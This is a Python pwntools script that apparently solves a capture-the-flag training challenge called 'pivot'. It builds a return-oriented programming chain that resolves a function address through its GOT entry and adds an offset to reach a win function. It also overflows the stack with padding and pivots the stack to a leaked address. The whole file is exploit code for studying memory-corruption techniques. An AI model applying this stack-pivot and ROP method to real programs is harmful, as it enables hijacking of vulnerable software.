import pwn
from pwn import *
p = process("./pivot")
context.binary = "pivot"
addr = p.recv(127) [-14:]
addr = int(addr, 16)



foothold_plt = p64(0x400720)
foothold_got = p64(0x601040)
ret2win_offset = 0x0000000000000a81
foothold_offset = 0x000000000000096a
add_offset = ret2win_offset - foothold_offset

pop_rbp = p64(0x00000000004007c8)
pop_rax = p64(0x00000000004009bb)
xchg = p64(0x00000000004009bd)
add_rax_rbp = p64(0x00000000004009c4)
mov_qword = p64(0x00000000004009c0)
call_rax = p64(0x00000000004006b0)

p.recvline()

chain = b""
chain += foothold_plt
chain += pop_rax
chain += foothold_got
chain += mov_qword
chain += pop_rbp
chain += p64(add_offset)
chain += add_rax_rbp
chain += call_rax
p.sendline(chain)

p.recvline()

offset = b"A"*40
smash = b""
smash += offset
smash += pop_rax
smash += p64(addr)
smash += xchg

p.sendline(smash)
p.recvline()
p.interactive()
